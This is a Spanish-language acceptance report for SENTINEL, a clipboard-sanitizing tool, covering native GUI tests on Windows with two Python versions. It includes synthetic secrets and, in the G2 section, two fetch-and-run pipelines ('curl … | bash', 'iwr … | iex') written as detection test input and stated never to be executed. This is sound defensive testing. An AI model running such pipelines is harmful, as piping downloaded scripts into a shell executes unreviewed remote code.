# Aceptación de SENTINEL en Windows

Observaciones de los días **23 y 24 de octubre de 2026**, zona
America/Mexico_City. Edición pública del 26 de octubre; no se repitieron pruebas.
Estado: **aceptación nativa de GUI completada en ambos Python dentro del
alcance observado**. Una apertura de proceso, un
test offscreen o un caso de CLI no acredita interacción visual nativa.
Las confirmaciones del operador se atribuyen al intérprete y al caso preguntado.

## Resultado consolidado del 24 de octubre de 2026

- GUI Python 3.14.9: **8/8 grupos aprobados**.
- GUI Python 3.11.9: **8/8 grupos aprobados**.
- Fallos de aceptación confirmados: **ninguno**. No se corrigió código de
  producto ni se reinstaló: no hubo un cambio que justificara repetir gates.
- Alcance: Windows 11 Pro 26300 AMD64, Qt/PySide6 6.11.2, tema oscuro,
  144 DPI (150% nominal), maximización y reducción al mínimo permitido,
  ejemplos sintéticos descritos y cierre pendiente con demora explícita de
  cinco segundos. Otros temas, escalas, monitores y carga de CPU real no se
  acreditan. Los límites Win32 anteriores se conservan más abajo.
- G1-G7 se basan en confirmaciones del operador; G2 en 3.14 tiene además
  capturas aportadas por él. Para G8 se corroboraron las observaciones con
  código 0 de los procesos y stderr vacío. No se usaron tests offscreen como
  sustitutos de interacción nativa.
- Git status y diff --check: **código 0 también desde el terminal integrado de
  VS Code**, confirmado por la salida aportada por el operador con
  `status_exit=0` y `diff_exit=0`. Comprobación administrativa completada.

| Intérprete | Modalidad de cierre | PID observado | Código | Evidencia nativa |
|---|---|---|---|---|
| 3.14.9 | Normal, producto instalado | 17020 | 0 | Usuario confirmó cierre; stderr vacío |
| 3.14.9 | Trabajador pendiente, demora de cinco segundos | 19876 | 0 | Usuario vio la espera y confirmó cierre; stderr vacío |
| 3.11.9 | Normal, producto instalado | 5592 | 0 | Usuario confirmó cierre; stderr vacío |
| 3.11.9 | Trabajador pendiente, demora de cinco segundos | 26184 | 0 | Usuario vio la espera y confirmó cierre; stderr vacío |

La tabla resume la evidencia de cierre. Los PID identifican procesos históricos,
no comandos ni identificadores para volver a operar sobre ellos. Los resultados
se consolidan en esta sección y en la matriz G1-G8.

## Entorno y procedencia

- Proyecto instalado en una ruta local; en los ejemplos se usa
  `C:\proyectos\sentinel` como ruta neutra, no como ruta de la máquina observada.
- Windows 11 Pro `10.0.26300`, compilación 26300, AMD64 de 64 bits.
- HEAD local: `6bbff3a3c277748117a5709eca8df159e2737cea`, rama `main`.
  Identifica el código de producto observado, no una nueva ejecución de CI.
- Git `2.53.0.windows.3`. El historial se recuperó previamente del bundle local;
  su recuperación se comprobó antes de la aceptación técnica.
- SENTINEL `0.0.1`, instalado normalmente en site-packages, sin modo editable.
- Python GUI: CPython `3.11.9` en `.venv/py311` y `3.14.9` en `.venv/py314`;
  ambos de 64 bits. Se comprobaron de nuevo sus versiones y rutas instaladas
  al comenzar esta aceptación; no se reinstaló el producto porque no cambió.
- PySide6, Qt, shiboken6, Essentials y Addons: `6.11.2`. Se conserva
  `PySide6>=6.11.2,<6.12` y no se modificó el adaptador ni la propiedad Win32.
- Pip: 24.0 en 3.11 y 26.2.2 en 3.14. Desarrollo previo: build 1.6.1,
  pip-audit 2.10.1, packaging 26.3 y setuptools 84.2.1 para el wheel.
- Historial, sincronización entre dispositivos, RDP y gestores externos:
  **desconocidos**, según el operador. No se cambiaron esas configuraciones.
- Tema observado: oscuro, por las capturas del operador. En una consulta de
  metadatos del 24 de octubre, GetDpiForWindow informó 144 DPI para la ventana
  SENTINEL (equivalente nominal a 150% respecto de 96 DPI). No se consultó ni
  cambió la configuración de pantalla; monitor y resolución siguen sin identificar.
  `QT_DEVICE_PIXEL_RATIO=auto` estaba presente, pero ese valor por sí solo no
  demuestra el porcentaje de escalado del escritorio.
- La observación GUI fue humana y guiada, complementada por capturas en los
  casos indicados y observadores de proceso para los cierres. Un PID,
  Responding=True o un resultado offscreen no acreditan una acción visual.

## Evidencia anterior conservada fuera de los entornos

Estas comprobaciones ya se realizaron; **no se repitieron al abrir este informe**.

| Comprobación anterior local | Resultado |
|---|---|
| CLI, Python 3.11.9 y 3.14.9, sin Qt | 165 descubiertas por entorno, 132 efectivas, exactamente 33 omisiones GUI esperadas; código 0 |
| GUI offscreen, ambos Python, Qt 6.11.2 | 165 ejecutadas por entorno, incluidas 33 GUI; cero omisiones; código 0 incluida finalización |
| pip check y compileall, cuatro entornos | Correctos |
| Build y gate de paquetes con Python 3.14.9 | Wheel 29 archivos, 24 módulos; sdist 62 archivos; metadatos, instalación externa sin Qt, ambos analizadores, diagnóstico sin Qt y reconstrucción de sdist correctos |
| Auditoría del runtime con Python 3.14.9 | CLI sin dependencias externas; GUI con cuatro paquetes 6.11.2, sin avisos conocidos reportados en esa consulta; no certifica todos los binarios nativos de Qt |
| Bloque ordinario real de portapapeles, ambos Python | Seis hallazgos, código 0; lector independiente confirmó salida exacta con Unicode, CRLF y salto final, disponibilidad tras terminar y segunda ejecución sin cambios |
| Texto público, placeholders y CF_UNICODETEXT vacío | Código 0, cero hallazgos; memoria, formatos y secuencia intactos en ambos Python |
| Imagen DIB sin texto | Error estático, código 2; imagen, formatos y secuencia intactos en ambos |
| Texto + HTML + RTF | Un hallazgo, código 0; salida exacta y eliminación de HTML/RTF en ambos |
| 1048576 bytes UTF-8 y un byte adicional | Límite exacto admitido; exceso rechazado con código 2 y muestra intacta en ambos |
| Emoji tras 4095 caracteres x | Un hallazgo, código 0, emoji íntegro y salida exacta en ambos |
| Sustituto UTF-16 aislado | Error estático, código 2; memoria y secuencia intactas en ambos |
| Salida expandida | Entrada 1048575 bytes UTF-8, 95325 hallazgos, salida exacta de 2097150 bytes UTF-8 en ambos |
| Contención de ocho segundos con otra ventana | Error de apertura, código 2, 5331 ms en 3.11 y 5314 ms en 3.14; contenido intacto |
| Conflicto con productor independiente | Error esperado y nueva copia intacta en ambos, incluida secuencia, formatos y hash; barrera de coordinación en primera CloseClipboard del binding real, no CLI sin instrumentación |

Los casos reales pertenecen al protocolo manual invocado por caso. La suite
automatizada usa dobles Win32/Wayland y el portapapeles virtual de offscreen.
No se ejecutaron comandos analizados ni se registraron originales sensibles.
La descripción completa de muestras y límites está en `windows-clipboard.md`.

Límites preservados:

- Primer intento con dos hallazgos: identidad de la muestra no verificada;
  causa indeterminada. Solo los reintentos con muestra completa verificada
  acreditan los seis hallazgos.
- Una muestra publicada sin terminador apareció terminada con dos bytes extra
  (46 frente a 44 solicitados). Se rechazó darla por preparada: el producto
  no recibió una muestra nativa sin NUL. Ese caso solo tiene cobertura simulada.
- Se descartaron intentos solapados de las utilidades locales y se repitieron
  secuencialmente. El holder inicial sin HWND propio se sustituyó por uno con
  ventana propia antes de acreditar contención. No son fallos de producto.
- La salida expandida se reintrodujo como entrada solo en 3.14: rechazo de
  tamaño con código 2 y contenido intacto. Ese subcaso no se acredita en 3.11.
- Fallos nativos de GlobalUnlock, CloseClipboard, DestroyWindow y
  SetClipboardData: cobertura simulada, sin provocación nativa ni garantía
  de ausencia de fugas.
- CI histórico: ejecución 39906129598 sobre `6bbff3a`, 11/11 trabajos correctos,
  según el registro previo; no es una ejecución nueva de esta aceptación.
- El informe de Windows no acredita Wayland. Sus observaciones están en
  [validacion-fedora.md](validacion-fedora.md), con sus propios límites.

Últimos artefactos comprobados antes de crear este informe:

| Artefacto 0.0.1 | SHA-256 |
|---|---|
| Wheel `sentinel_clipboard_firewall-0.0.1-py3-none-any.whl` | `4f51790f0aae8c955f4c4d61f843f6a1611c1e4c223fded7ffefcbe19866c271` |
| Sdist `sentinel_clipboard_firewall-0.0.1.tar.gz` | `04eb90c37ebb92719850c44a13862519ac1b8e9b5db31da4cbd2f88fa2aec7be` |

Esos hashes identifican un snapshot anterior a este documento. El sdist de 62
archivos no contiene este informe nuevo. No se atribuye su gate a documentación
posterior, ni se reconstruyen paquetes solo para repetir evidencia ya válida.

## Lista breve de aceptación y resultados nativos

`Pendiente` significa no observado o no confirmado. `Parcial` no cierra el caso.
Una respuesta conjunta positiva acredita solo las acciones expresamente incluidas
en la pregunta. Los fallos se registrarán con reproducción antes de corregir.

| ID | Grupo | Python 3.14.9 | Python 3.11.9 |
|---|---|---|---|
| G1 | Inspeccionar y Sanitizar | **Aprobado por el operador** para la muestra breve: dos hallazgos, metadatos sin valores y salida esperada | **Aprobado por el operador** para la misma muestra breve |
| G2 | Command Guard Bash y PowerShell | **Aprobado por evidencia visual del operador**: CF-BASH-001 y CF-PS-001, un hallazgo en cada captura | **Aprobado por el operador**: ambos códigos esperados |
| G3 | Tab, Shift+Tab y Espacio | **Aprobado por confirmación contextual del operador** («listo» tras las instrucciones de recorrido y Espacio); capturas corroboran resultados, no las teclas | **Aprobado por el operador**: «funcionan los 3» para Tab, Shift+Tab y Espacio |
| G4 | Salida seleccionable y de solo lectura | **Aprobado por el operador**: selección con Ctrl+A y texto intacto al escribir X/Retroceso | **Aprobado por el operador**: selección y rechazo de edición |
| G5 | Editar descarta salida y Limpiar vacía ambas áreas | **Aprobado por el operador** | **Aprobado por el operador** |
| G6 | Copiar y pegar visualmente en documento de prueba | **Aprobado por el operador**: salida breve exacta en Bloc de notas y pegado de vuelta en Entrada | **Aprobado por el operador**: muestra breve exacta en Bloc de notas y en Entrada, con descarte de salida |
| G7 | Redimensionar, tema y escala observados | **Aprobado por el operador en el alcance observado**: oscuro, 144 DPI (150% nominal), maximizada y reducida al mínimo permitido; otros temas/escalas no probados | **Aprobado por el operador en el alcance observado**: tema oscuro, 144 DPI, legibilidad maximizada y reducida; otros temas/escalas no probados |
| G8 | Cierre normal y cierre con trabajo pendiente | **Aprobado**: usuario confirmó ambas modalidades y ambos procesos terminaron con código 0; segunda modalidad coordinada con demora sintética de cinco segundos | **Aprobado**: ambas modalidades confirmadas, procesos con código 0; segunda modalidad con la misma demora sintética |

## Método de observación y límites de la secuencia GUI

Las dos rondas se observaron por separado; no se heredaron resultados entre
intérpretes. La disponibilidad de control automático fue insuficiente en esa
sesión, por lo que se utilizó confirmación humana de cada bloque. Las capturas
de Command Guard de 3.14 muestran CF-BASH-001 y CF-PS-001, severidad high y un
hallazgo por caso, sin el comando original en Salida. Las imágenes corroboran
resultados y legibilidad, pero no prueban por sí solas los eventos de teclado.

El recorrido Tab/Shift+Tab y Espacio se confirmó contextualmente por el
operador en ambos Python. Solo lectura y copia/pegado se comprobaron con una
muestra breve en Bloc de notas y retorno a Entrada; no se extrapoló un pegado
Unicode multilínea visual no observado. La conservación Unicode/CRLF por
bytes corresponde al protocolo independiente de CLI, documentado por separado.

Para legibilidad se combinaron observación humana al maximizar y reducir
con GetDpiForWindow=144. Una consulta no maximizada de la ronda 3.14 informó
GetWindowRect=997×866; no demuestra por sí sola maniobras ni legibilidad.
El diagnóstico estableció su propia conciencia DPI por monitor V2 y no cambió
la configuración del sistema ni la de SENTINEL. No se acredita una reducción
exacta a 800×600 ni otros temas/escalados/monitores.

En los cierres se usó un observador de solo lectura con
WaitForSingleObject/GetExitCodeProcess, sin inyección de entradas ni lectura
del clipboard. La demora de cinco segundos del lanzador manual no modifica
site-packages ni el producto. Una ventana abierta o una operación que termina
antes de solicitar cierre no acredita cierre con trabajo pendiente. Los cuatro
resultados de la tabla consolidada tuvieron salida 0, stderr vacío y ausencia
de ventanas restantes. No equivale a rendimiento bajo carga real.

Errores administrativos descartados: comandos PowerShell ejecutados en CMD,
Git fuera del directorio del proyecto y una primera consulta en terminal externo
no acreditaban el contexto integrado de VS Code. Se corrigió el procedimiento;
status_exit=0 y diff_exit=0 se confirmaron en el contexto previsto. No eran
fallos del producto ni motivo para inicializar o reparar el repositorio.

## Procedimiento reproducible por intérprete

Trabajar primero con una sola ventana 3.14 y después con 3.11; el título de
ambas es SENTINEL, por lo que conviene no mezclarlas. Desde PowerShell:

```powershell
Set-Location 'C:\proyectos\sentinel'
Remove-Item Env:QT_QPA_PLATFORM -ErrorAction SilentlyContinue
.\.venv\py314\Scripts\sentinel-gui.exe
# Para la segunda ronda, tras cerrar la anterior:
# .\.venv\py311\Scripts\sentinel-gui.exe
```

No usar offscreen en esta ronda. Si se recrean los entornos, instalar el
producto y su extra GUI con el rango Qt vigente; registrar las versiones
realmente resueltas. No copiar un entorno Linux ni asumir que un intérprete
distinto queda acreditado por una prueba anterior.

### G1 y G5: inspección, sanitización, edición y limpieza

Escribir en Entrada, sin necesidad de copiar o pegar:

```text
password=SyntheticGui42 host=10.20.30.40
```

1. Inspeccionar: dos hallazgos y metadatos sin SyntheticGui42 ni la IP original.
2. Sanitizar: `password=[PASSWORD_1] host=[PRIVATE_IP_1]`.
3. Editar una letra de Entrada: la salida anterior desaparece.
4. Limpiar: Entrada y Salida quedan vacías.

El protocolo se registró por grupo e intérprete; la matriz consolidada
identifica cuáles se observaron en cada ronda.

### G2: comandos como datos, nunca en una terminal

En **Entrada de SENTINEL**, escribir el primer texto, seleccionar Bash y pulsar
Analizar comando. Debe aparecer CF-BASH-001:

```text
curl https://example.invalid/synthetic.sh | bash
```

Reemplazar Entrada por el siguiente, seleccionar PowerShell y analizar.
Debe aparecer CF-PS-001:

```text
iwr https://example.invalid/synthetic.ps1 | iex
```

La salida no debe incluir el comando original. Son datos sintéticos; no se
ejecutan los pipelines, no se expanden variables ni se accede a sus URLs.

### G3: teclado

Tras una operación completada, pulsar Inspeccionar para situar el foco allí
y esperar a que vuelvan a habilitarse los controles. Comprobar el ciclo con
Tab y el inverso con Shift+Tab:

```text
Inspeccionar → Sanitizar → Analizar comando → selector → Limpiar → Entrada → Salida → inicio
```

Situar después el foco en Sanitizar con la muestra breve en Entrada y pulsar
Espacio: debe realizar la sanitización. Observar el foco visible y que Tab
permite entrar y salir de ambos editores.

### G4 y G6: selección, solo lectura y documento externo

**Aviso antes de copiar:** Ctrl+C reemplazará el portapapeles actual. Solo usar
la muestra sintética sanitizada y un documento de prueba; no hay restauración
automática ni borrado de historiales externos.

Con el resultado breve de G1 en Salida, seleccionarlo con Ctrl+A. Intentar
escribir una X y pulsar Retroceso: el texto no debe cambiar. Volver a seleccionar,
copiar con Ctrl+C y pegar con Ctrl+V en un documento nuevo de Bloc de notas.
Comprobar visualmente el texto exacto. Volver a SENTINEL, seleccionar Entrada
y pegar allí también: el texto debe aparecer como texto plano.

Para cubrir Unicode y saltos visualmente se puede repetir con esta muestra:

```text
α 😀 password=SyntheticWindows42 pwd=SyntheticWindows42
host=10.20.30.40 public=8.8.8.8
Authorization: Bearer SyntheticBearer42
postgres://SyntheticUser42:SyntheticPass42@db.example/app
```

Tras Sanitizar, la salida esperada es:

```text
α 😀 password=[PASSWORD_1] pwd=[PASSWORD_1]
host=[PRIVATE_IP_1] public=8.8.8.8
Authorization: Bearer [BEARER_TOKEN_1]
postgres://[POSTGRES_USER_1]:[POSTGRES_PASSWORD_1]@db.example/app
```

El editor Qt puede normalizar finales de línea. Un pegado visual no demuestra
conservación byte a byte; esa propiedad de CLI se verificó por separado.

### G7: legibilidad y condiciones disponibles

Anotar tema claro/oscuro, porcentaje de escala, resolución y monitor si se
conocen. Maximizar y reducir aproximadamente a 800×600; observar botones,
selector, etiquetas, foco, texto y desplazamiento de líneas largas. Anotar el
tamaño donde aparezca un corte. Comprobar otros temas/escalados disponibles
cuando sea posible, registrando cada combinación observada. Una condición
no probada queda pendiente o fuera del alcance explícito; no se presume aprobada.

### G8: cierre

Normal: cerrar con la X cuando no hay trabajo; comprobar que desaparece sin
diálogos o errores. Registrar por separado un cierre mientras se observa
Procesando: debe esperar al trabajador sin bloquear ni abortar, y cerrar al
terminar. Si la operación finaliza antes de solicitar el cierre, ese intento
no acredita trabajo pendiente. Se puede usar una demora sintética explícita
del trabajador para coordinar una ronda manual, sin modificar el producto instalado.

Se utilizó este lanzador manual para las dos rondas de cierre pendiente en
`.venv/validation-2026-10-23/manual_gui_pending_close.py`. El código se conserva
también aquí para que sea reproducible aunque se eliminen los entornos:

```python
import os
import time
os.environ.pop('QT_QPA_PLATFORM', None)
from sentinel.gui import worker
from sentinel.gui.app import main
original_analyze = worker.analyze

def delayed_analyze(text, operation, shell):
    time.sleep(5)
    return original_analyze(text, operation, shell)

worker.analyze = delayed_analyze
if __name__ == '__main__':
    raise SystemExit(main())
```

Con la ventana ordinaria ya cerrada, lanzar manualmente el script con el
pythonw.exe del intérprete correspondiente. Escribir la muestra breve, pulsar
Sanitizar y cerrar con la X mientras aún se ve Procesando, durante la demora
de cinco segundos. Debe mostrarse la espera de cierre, conservarse la respuesta
de la interfaz y cerrarse al finalizar, sin aborto ni error de QThread.
Registrar por separado cierre ordinario e instrumentado. La demora no acredita
rendimiento bajo carga real ni añade un test automatizado de GUI nativa.

